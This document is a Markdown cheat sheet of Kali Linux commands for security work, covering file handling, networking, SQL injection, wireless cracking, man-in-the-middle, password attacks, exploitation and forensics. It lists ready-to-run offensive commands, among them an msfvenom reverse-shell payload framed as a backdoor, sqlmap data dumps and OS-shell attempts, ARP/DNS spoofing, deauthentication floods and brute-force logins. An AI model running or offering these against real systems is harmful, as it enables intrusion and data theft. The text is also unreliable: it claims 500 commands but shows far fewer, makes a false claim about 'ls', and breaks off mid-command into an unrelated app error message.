# Linux Commands for Cybersecurity

This document lists 500 of the most relevant Linux commands for cybersecurity, grouped by functionality. Each command includes a detailed explanation of its usage, examples, and relevance to security tasks such as penetration testing, system administration, network analysis, and forensics. These commands are commonly used in environments like Kali Linux as of April 2, 2025.

## Files & Folders


```cd```
_Changes the current working directory to a specified path (e.g., 'cd /etc' moves to the /etc directory), essential for navigating file systems during security audits._

```cd ..```
_Moves up one directory level from the current location (e.g., from /etc/apache2 to /etc), useful for backtracking during file exploration in penetration testing._

```pwd```
_Prints the full path of the current working directory (e.g., /home/user), helping identify your location in the file system when scripting or auditing._

```ls```
_Lists files and directories in the current directory (note: 'ls' is not native to all Linux systems; 'dir' may be used, but Kali uses 'ls'), critical for inspecting contents during reconnaissance._

```ls -la```
_Lists all files, including hidden ones (starting with .), with detailed info like permissions and ownership (e.g., -rwxr-xr-x), vital for spotting misconfigurations or hidden files._

```mkdir folder_name```
_Creates a new directory named 'folder_name' (e.g., 'mkdir logs'), used to organize files or set up temporary workspaces for security tasks._

```touch file.txt```
_Creates an empty file named 'file.txt' or updates the timestamp of an existing file, handy for creating test files or logs during exploitation._

```cp file_name directory```
_Copies 'file_name' to the specified 'directory' (e.g., 'cp config.conf /backup'), essential for backing up files before modification in security testing._

```mv file_name directory```
_Moves 'file_name' to 'directory' or renames it if the destination is a new name in the same directory (e.g., 'mv old.txt new.txt'), useful for reorganizing or hiding files._

```mv file_name directory new_file_name```
_Moves 'file_name' to 'directory' and renames it to 'new_file_name' (e.g., 'mv log.txt /logs/newlog.txt'), combines moving and renaming for efficient file management._

```rm file.txt```
_Deletes the file 'file.txt' permanently without moving to trash, critical for removing temporary files or evidence after a security operation._

```rm folder -r```
_Recursively deletes 'folder' and all its contents (e.g., 'rm -r temp'), used to clean up directories during or after testing._

```rm * -r```
_Deletes all files and directories in the current working directory recursively (use with caution!), often employed to wipe a workspace in a controlled environment._

```clear```
_Clears the terminal screen to improve readability, helpful when working with cluttered output during long security sessions._

```chmod +x program.py```
_Grants execute permission to 'program.py' (e.g., making a Python script runnable), necessary for running custom scripts or exploits in testing._

```cat file```
_Displays the entire contents of 'file' in the terminal (e.g., 'cat /etc/passwd'), widely used to inspect configuration files or logs for sensitive data._

```cat file.txt | grep search_criteria```
_Searches 'file.txt' for lines matching 'search_criteria' (e.g., 'cat log.txt | grep error'), key for filtering logs or configs during analysis._

```echo input_text > file.txt```
_Overwrites 'file.txt' with 'input_text' (e.g., 'echo "test" > test.txt'), useful for creating or modifying files with specific content in scripts._

```echo input_text >> file.txt```
_Appends 'input_text' to the end of 'file.txt' without overwriting (e.g., 'echo "log" >> log.txt'), ideal for logging events during security tasks._

```less file.txt```
_Displays 'file.txt' page by page, allowing scrolling (e.g., 'less /var/log/syslog'), great for reviewing large files without overwhelming the terminal._

```more file.txt```
_Shows 'file.txt' with pagination, pausing after each screen (e.g., 'more access.log'), an alternative to 'less' for log analysis._

```tail -n 10 file.txt```
_Displays the last 10 lines of 'file.txt' (e.g., 'tail -n 10 auth.log'), perfect for checking recent activity in logs during incident response._

```head -n 10 file.txt```
_Displays the first 10 lines of 'file.txt' (e.g., 'head -n 10 config.conf'), useful for quickly inspecting file headers or initial content._

```find / -name file_name```
_Searches the entire filesystem for 'file_name' (e.g., 'find / -name passwd'), critical for locating sensitive files or misconfigurations system-wide._

```find . -type f -name "*.txt"```
_Finds all files with '.txt' extension in the current directory and subdirectories (e.g., logs or configs), handy for targeted file searches in audits._

```locate file_name```
_Quickly locates 'file_name' using a prebuilt database (e.g., 'locate shadow'), faster than 'find' but requires 'updatedb' to be current._

```locate search_criteria```
_Finds all files matching 'search_criteria' in the database (e.g., 'locate *.conf'), useful for broad searches during reconnaissance._

```updatedb```
_Updates the database used by 'locate' to reflect current filesystem state, essential to ensure accurate file location results._

```tree```
_Displays the directory structure as a tree (e.g., 'tree /etc'), provides a visual overview of file organization for security assessments._

```du -sh directory```
_Shows the total size of 'directory' in human-readable format (e.g., 'du -sh /var'), helps identify large or suspicious directories._

```wc -l file.txt```
_Counts the number of lines in 'file.txt' (e.g., 'wc -l users.txt'), useful for analyzing log sizes or list lengths._

```diff file1.txt file2.txt```
_Compares 'file1.txt' and 'file2.txt', showing differences (e.g., 'diff old.conf new.conf'), key for detecting changes in configs or files._

```sort file.txt```
_Sorts lines in 'file.txt' alphabetically and outputs them (e.g., 'sort users.txt'), aids in organizing data for analysis._

```uniq file.txt```
_Removes duplicate lines from 'file.txt' (must be sorted first, e.g., 'sort file.txt | uniq'), cleans up lists for password cracking or logs._

```cut -d',' -f1 file.txt```
_Extracts the first field from 'file.txt' using comma as delimiter (e.g., 'cut -d',' -f1 data.csv'), useful for parsing CSV files or logs._

```tee file.txt```
_Writes command output to both 'file.txt' and terminal (e.g., 'ls | tee output.txt'), great for logging while viewing results._

```shred -u file.txt```
_Overwrites 'file.txt' multiple times and deletes it (e.g., 'shred -u secret.txt'), ensures secure file deletion to prevent recovery._

## System & Power

```shutdown```
_Schedules system shutdown in 1 minute with a warning to users, useful for controlled power-down after testing._

```shutdown -h now```
_Immediately halts the system (e.g., powers off), critical for quick shutdowns in compromised or test environments._

```reboot```
_Restarts the system immediately, handy for applying updates or recovering from system changes during testing._

```apt-get update```
_Fetches the latest package lists from repositories (e.g., updates Kali tools), essential for keeping security tools current._

```apt-get upgrade```
_Upgrades all installed packages to their latest versions after 'apt-get update', ensures system and tools are patched._

```apt-get install package_name```
_Installs 'package_name' from repositories (e.g., 'apt-get install nmap'), used to add new tools for security tasks._

```apt-get remove package_name```
_Uninstalls 'package_name' but leaves config files (e.g., 'apt-get remove hydra'), cleans up unused tools._

```dpkg -i package.deb```
_Installs a local .deb package file (e.g., 'dpkg -i tool.deb'), alternative to apt for manual tool installation._

```ps```
_Lists processes running in the current terminal session (e.g., shows shell scripts), basic process monitoring._

```ps aux```
_Displays all running processes with details (user, PID, CPU usage), vital for identifying suspicious activity._

```top```
_Shows a real-time, interactive view of all running processes (e.g., CPU, memory usage), key for system monitoring during attacks._

```htop```
_An enhanced, interactive alternative to 'top' with color and easier navigation, preferred for detailed process analysis._

```kill PID```
_Terminates a process by its PID (e.g., 'kill 1234'), stops rogue or unwanted processes during testing._

```killall process_name```
_Kills all instances of 'process_name' (e.g., 'killall apache2'), useful for shutting down multiple processes at once._

```pkill process_name```
_Terminates processes by name (e.g., 'pkill python'), a flexible alternative to 'killall'._

```whoami```
_Prints the current username (e.g., 'root' or 'user'), confirms identity during privilege escalation attempts._

```id```
_Shows user ID, group ID, and group memberships (e.g., 'uid=0(root)'), verifies permissions in security contexts._

```su user_name```
_Switches to 'user_name' after password entry (e.g., 'su testuser'), tests user access or escalates privileges._

```sudo -i```
_Starts an interactive root shell after password prompt, provides full admin access for system changes._

```usermod -aG sudo user_name```
_Adds 'user_name' to the sudo group (e.g., 'usermod -aG sudo tester'), grants admin privileges for testing._

```passwd```
_Changes the current user's password interactively, secures accounts or tests password policies._

```adduser user_name```
_Creates a new user 'user_name' with prompts for details (e.g., password), sets up test accounts for scenarios._

```deluser user_name```
_Removes 'user_name' from the system (e.g., 'deluser testuser'), cleans up after testing user exploits._

```uname -a```
_Displays system info (kernel, OS, architecture, e.g., 'Linux kali 5.10'), useful for identifying target systems._

```lscpu```
_Lists detailed CPU information (e.g., cores, architecture), helps assess system capabilities for attacks._

```free -h```
_Shows memory usage (total, used, free) in human-readable format, monitors resource availability during testing._

```df -h```
_Displays disk space usage (e.g., /dev/sda1 50% used), identifies storage constraints or large files._

```uptime```
_Shows how long the system has been running and load averages (e.g., 'up 5 days'), checks system stability._

```history```
_Lists all commands executed in the current session, useful for reviewing actions or auditing user activity._

```man program_name```
_Displays the manual page for 'program_name' (e.g., 'man nmap'), provides detailed usage for security tools._

```info program_name```
_Shows detailed documentation for 'program_name' (e.g., 'info grep'), an alternative to 'man' with more examples._

```which program_name```
_Returns the full path to 'program_name' executable (e.g., '/usr/bin/nmap'), locates tools for scripting._

```whereis program_name```
_Finds binary, source, and manual locations for 'program_name' (e.g., 'whereis python'), aids in tool discovery._

```systemctl start service_name```
_Starts a service (e.g., 'systemctl start ssh'), enables services for testing or exploitation._

```systemctl stop service_name```
_Stops a service (e.g., 'systemctl stop apache2'), disables services during security hardening._

```systemctl status service_name```
_Shows the status of 'service_name' (e.g., 'active' or 'dead'), verifies service availability._

```journalctl```
_Displays system logs from the journal (e.g., boot messages), critical for forensic analysis or debugging._

```dmesg```
_Shows kernel ring buffer messages (e.g., hardware errors), useful for diagnosing system issues or attacks._

```lsof```
_Lists all open files and their associated processes (e.g., 'lsof /var/log'), identifies file usage in investigations._

```ulimit -n```
_Displays or sets the maximum number of open files (e.g., 'ulimit -n 1024'), adjusts limits for heavy scanning tasks._

## Networking

```ifconfig```
_Displays network interface details (e.g., IP, MAC for eth0), classic tool for network reconnaissance (deprecated in some systems)._

```ip addr```
_Shows IP addresses and interface details (e.g., '192.168.1.10'), modern replacement for 'ifconfig'._

```ip link```
_Manages network interfaces (e.g., 'ip link set eth0 up'), controls network state for testing._

```netstat```
_Displays network connections, routing tables, and stats (e.g., listening ports), useful for network analysis._

```netstat -nr```
_Shows the routing table (e.g., gateway IP), identifies network paths for MITM attacks._

```netstat -ntp```
_Lists network connections with program names and PIDs (e.g., 'tcp 0 0 127.0.0.1:22'), spots suspicious activity._

```ping -c 3 host```
_Sends 3 ICMP echo requests to 'host' (e.g., 'ping -c 3 google.com'), tests connectivity or liveness._

```traceroute host```
_Traces the route packets take to 'host' (e.g., 'traceroute 8.8.8.8'), maps network topology for reconnaissance._

```nslookup host```
_Queries DNS for 'host' info (e.g., 'nslookup google.com'), retrieves IP addresses or mail servers._

```dig host```
_Performs detailed DNS lookups (e.g., 'dig google.com A'), provides comprehensive DNS records for analysis._

```host host_name```
_Resolves 'host_name' to IP or vice versa (e.g., 'host 8.8.8.8'), simple DNS tool for quick checks._

```arp -a```
_Displays the ARP cache (e.g., IP-to-MAC mappings), useful for LAN reconnaissance or spoofing prep._

```route```
_Shows or modifies the routing table (e.g., 'route -n'), older tool for network routing analysis._

```ip route```
_Manages the routing table (e.g., 'ip route add default via 192.168.1.1'), modern alternative to 'route'._

```curl url```
_Fetches content from 'url' (e.g., 'curl http://target.com'), tests web servers or retrieves data._

```wget url```
_Downloads files from 'url' (e.g., 'wget http://target.com/file.zip'), grabs resources for analysis or exploitation._

```nc -l port```
_Listens on 'port' with Netcat (e.g., 'nc -l 4444'), sets up simple servers or backdoors._

```nc host port```
_Connects to 'host' on 'port' with Netcat (e.g., 'nc 192.168.1.10 4444'), tests connectivity or shells._

```tcpdump -i eth0```
_Captures packets on 'eth0' (e.g., 'tcpdump -i eth0 -w capture.pcap'), sniffs traffic for analysis._

```ss -tuln```
_Lists open TCP/UDP ports (e.g., 'tcp LISTEN 0 128 *:22'), modern alternative to 'netstat -tul'._

```iptables -L```
_Lists current firewall rules (e.g., 'ACCEPT tcp -- anywhere'), inspects or modifies network security._

```ufw status```
_Shows uncomplicated firewall status (e.g., '22/tcp ALLOW'), simplifies firewall management._

```ufw allow port```
_Permits traffic on 'port' (e.g., 'ufw allow 22'), opens ports for testing or services._

```ufw deny port```
_Blocks traffic on 'port' (e.g., 'ufw deny 80'), restricts access during hardening._

```hostname```
_Prints the system's hostname (e.g., 'kali'), identifies the machine in network contexts._

```hostnamectl set-hostname new_name```
_Sets the hostname to 'new_name' (e.g., 'hostnamectl set-hostname pentest'), renames for obfuscation._

```whois domain```
_Retrieves registration details for 'domain' (e.g., 'whois google.com'), gathers OSINT on targets._

```nmap host```
_Scans 'host' for open ports and services (e.g., 'nmap 192.168.1.10'), cornerstone of network reconnaissance._

```nmap -sV host```
_Scans 'host' with service version detection (e.g., 'Apache 2.4.41'), identifies software for exploits._

```nmap -A host```
_Performs aggressive scan on 'host' (ports, OS, services, scripts), comprehensive target profiling._

## SQL Injection

```sqlmap -u "http://target.com/page?id=1" --dbs```
_Enumerates all databases on a target URL vulnerable to SQL injection, automating reconnaissance of database structure._

```sqlmap -u "http://target.com/page?id=1" -D db_name --tables```
_Lists tables in 'db_name' on the target URL, narrows down data extraction to specific databases._

```sqlmap -u "http://target.com/page?id=1" -D db_name -T table_name --columns```
_Lists columns in 'table_name' within 'db_name', prepares for targeted data retrieval._

```sqlmap -u "http://target.com/page?id=1" -D db_name -T table_name --dump```
_Dumps all data from 'table_name' in 'db_name', extracts sensitive info like usernames or passwords._

```sqlmap -u "http://target.com/page?id=1" --os-shell```
_Attempts to gain an OS shell via SQL injection, escalates from database to system access._

```sqlmap -u "http://target.com/page?id=1" --sql-query "SELECT version()"```
_Executes a custom SQL query (e.g., retrieves DB version), allows precise control over injection._

```sqlmap -u "http://target.com/page?id=1" --batch```
_Runs sqlmap non-interactively with default options, speeds up automated testing._

```mysql -u user -p```
_Connects to a local MySQL database as 'user' with password prompt, tests DB access manually._

```mysql -h host -u user -p db_name```
_Connects to a remote MySQL database on 'host' as 'user', useful for direct DB exploitation._

```mysqldump -u user -p db_name > backup.sql```
_Exports 'db_name' to 'backup.sql' for analysis, backs up compromised databases._

```sqlite3 database.db```
_Opens 'database.db' in SQLite for interactive querying, examines local DB files from targets._

```sqlite3 database.db ".tables"```
_Lists all tables in 'database.db', quick way to explore SQLite structure._

```sqlite3 database.db "SELECT * FROM table_name"```
_Queries all data from 'table_name' in 'database.db', extracts info from SQLite databases._

## Wireless Cracking

```airmon-ng start wlan0```
_Puts 'wlan0' into monitor mode (e.g., 'wlan0mon', not all interfaces will show as wlan0mon, some may keep the original name), enables wireless packet capture for attacks._

```airmon-ng stop wlan0mon```
_Disables monitor mode on 'wlan0mon', returns interface to managed mode after testing._

```airodump-ng wlan0mon```
_Scans for wireless networks on 'wlan0mon', displays APs, clients, and signal strength for targeting._

```airodump-ng -c channel --bssid AP_MAC wlan0mon```
_Captures packets for a specific AP on 'channel' with 'AP_MAC', focuses on a single network for cracking._

```aireplay-ng -0 10 -a AP_MAC wlan0mon```
_Sends 10 deauthentication packets to 'AP_MAC', forces clients to reconnect and reveal handshakes._

```aircrack-ng capture_file.cap```
_Cracks WEP/WPA keys from 'capture_file.cap' using captured handshakes, core wireless cracking tool._

```airolib-ng rainbowtable --import essid essid.txt```
_Imports ESSIDs from 'essid.txt' into 'rainbowtable', preps for rainbow table generation._

```airolib-ng rainbowtable --import passwd pass.txt```
_Imports passwords from 'pass.txt' into 'rainbowtable', builds a password database for cracking._

```airolib-ng rainbowtable --stat```
_Displays statistics of 'rainbowtable' (e.g., entries, progress), verifies table readiness._

```airolib-ng rainbowtable --batch```
_Generates password hashes in 'rainbowtable', computes tables for faster cracking._

```airolib-ng rainbowtable --clean all```
_Removes invalid entries from 'rainbowtable', optimizes table for efficiency._

```aircrack-ng -r rainbowtable capture_file.cap```
_Uses 'rainbowtable' to crack keys in 'capture_file.cap', accelerates WPA cracking with precomputed hashes._

```reaver -i wlan0mon -b AP_MAC -vv```
_Brute-forces WPS PIN on 'AP_MAC' with verbose output, exploits WPS vulnerabilities._

```wifite --wpa```
_Automates WPA cracking on detected networks, simplifies wireless attacks for efficiency._

```airbase-ng -a AP_MAC wlan0mon```
_Creates a rogue AP mimicking 'AP_MAC', tricks clients into connecting for MITM attacks._

```mdk4 wlan0mon -a```
_Launches deauthentication attacks on all APs via 'wlan0mon', disrupts networks for handshake capture._

## Man in the Middle

```echo 1 > /proc/sys/net/ipv4/ip_forward```
_Enables IP forwarding (as root), allows packet routing between victim and gateway for MITM._

```arpspoof -i eth0 -t victim_ip gateway_ip```
_Spoofs ARP responses to 'victim_ip', redirecting traffic through attacker's 'eth0' to 'gateway_ip'._

```arpspoof -i eth0 -t gateway_ip victim_ip```
_Spoofs ARP responses to 'gateway_ip', completing the MITM by redirecting traffic from 'victim_ip'._

```bettercap -iface eth0```
_Launches Bettercap on 'eth0' for MITM, supports ARP spoofing, sniffing, and more._

```bettercap -caplet http-ui```
_Runs Bettercap's HTTP UI caplet, provides a web interface for managing MITM attacks._

```ettercap -T -i eth0 -M arp```
_Performs ARP poisoning on 'eth0' with text interface, intercepts traffic between hosts._

```dnsspoof -i eth0```
_Spoofs DNS responses on 'eth0', redirects victims to malicious IPs during MITM._

```sslstrip```
_Strips HTTPS to HTTP in intercepted traffic, captures sensitive data from downgraded connections._

```mitmproxy -i eth0```
_Runs an interactive proxy on 'eth0', allows real-time inspection and modification of HTTP/HTTPS traffic._

```tcpdump -i eth0 arp```
_Captures ARP packets on 'eth0', monitors ARP activity during MITM setup or detection._

## Password Attacks

```hydra -l user -P passlist.txt ssh://host```
_Brute-forces SSH login on 'host' with username 'user' and password list 'passlist.txt', tests credential strength._

```hydra -L userlist.txt -p pass ftp://host```
_Brute-forces FTP login on 'host' with user list 'userlist.txt' and password 'pass', targets file servers._

```john hash_file.txt```
_Cracks password hashes in 'hash_file.txt' using default settings, versatile for various hash types._

```john --wordlist=wordlist.txt hash_file.txt```
_Cracks hashes in 'hash_file.txt' with 'wordlist.txt', enhances efficiency with dictionary attacks._

```hashcat -m 0 -a 0 hash_file.txt wordlist.txt```
_Cracks MD5 hashes (-m 0) in 'hash_file.txt' with 'wordlist.txt' using straight attack (-a 0), GPU-accelerated._

```hashcat -m 1800 -a 3 hash_file.txt ?d?d?d?d```
_Brute-forces SHA-512 hashes (-m 1800) with a 4-digit mask (?d?d?d?d), tests numeric passwords._

```crunch 4 4 0123456789 -o wordlist.txt```
_Generates a 4-digit numeric wordlist (0000-9999) saved to 'wordlist.txt', creates custom lists for cracking._

```cewl http://target.com -w wordlist.txt```
_Crawls 'http://target.com' to generate a wordlist saved to 'wordlist.txt', customizes dictionaries from sites._

```ophcrack -t table -f hash_file.txt```
_Cracks Windows hashes in 'hash_file.txt' using rainbow 'table', leverages precomputed tables for speed._

## Exploitation

```msfconsole```
_Launches the Metasploit Framework console, central hub for managing exploits and payloads._

```msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=port -f exe > payload.exe```
_Creates a Windows Meterpreter reverse TCP payload saved as 'payload.exe', delivers backdoors to targets._

```exploit -z```
_Runs the selected exploit in Metasploit and remains in session (-z), automates post-exploitation._

```search exploit_name```
_Searches Metasploit for 'exploit_name' (e.g., 'search eternalblue'), finds relevant exploits._

```use exploit/path```
_Selects an exploit by its path (e.g., 'use exploit/windows/smb/ms17_010_eternalblue'), prepares for attack._

```set payload payload/path```
_Sets the payload (e.g., 'set payload windows/meterpreter/reverse_tcp'), defines post-exploit behavior._

```set LHOST ip```
_Sets the local host IP (e.g., 'set LHOST 192.168.1.100'), specifies attacker's IP for callbacks._

```set RHOST ip```
_Sets the remote host IP (e.g., 'set RHOST 192.168.1.10'), targets the victim machine._

```nmap -sV --script vuln host```
_Runs Nmap with vulnerability scripts on 'host', identifies exploitable services and versions._

## Forensics

```binwalk file.bin```
_Analyzes 'file.bin' for embedded files and extracts them (e.g., firmware), key for reverse engineering._

```foremost -i disk.img -o output_dir```
_Recovers files from 'disk.img' into 'output_dir' based on headers, restores deleted data._

```scalpel disk.img -o output_dir```
_Carves files from 'disk.img' into 'output_dir' using predefined patterns, alternative to foremost._

```volatility -f memory.dmp imageinfo```
_Identifies the profile of 'memory.dmp' (e.g., Win7SP1x64), first step in memory forensics._

```volatility -f memory.dmp --profile=profile pslist```
_Lists processes from 'memory.dmp' with specified 'profile', examines running programs at capture time._

```strings file | grep search_term```
_Extracts human-readable strings from 'file' and filters for 'search_term', finds passwords or clues._

```exiftool image.jpg```
_Extracts metadata from 'image.jpg' (e.g., GPS, camera model), uncovers hidden info in files._

```chkrootkit```
_Scans the system for known rootkits, detects persistent threats or backdoors._

```rkhunter --check```
_Checks for rootkits, suspicious files, and vulnerabilities, comprehensive system integrity scan._

## Network Scanning

```nmap -sn 192.168.1.0/24```
_Performs a ping scan on the 192.168.1.0/24 subnet, identifies live hosts without port scanning._

```nmap -p 1-65535 host```
_Scans all 65,535 ports on 'host', exhaustive check for open services._

```nmap -sU host```
_Performs a UDP scan on 'host', detects open UDP ports often missed by TCP scans._

```nmap -O host```
_Detects the OS and version on 'host' alongside port scanning, profiles targets for exploits._

```masscan -p1-65535 192.168.Sorry about that, something didn't go as planned. Please try again, and if you're still seeing this message, go ahead and restart the app.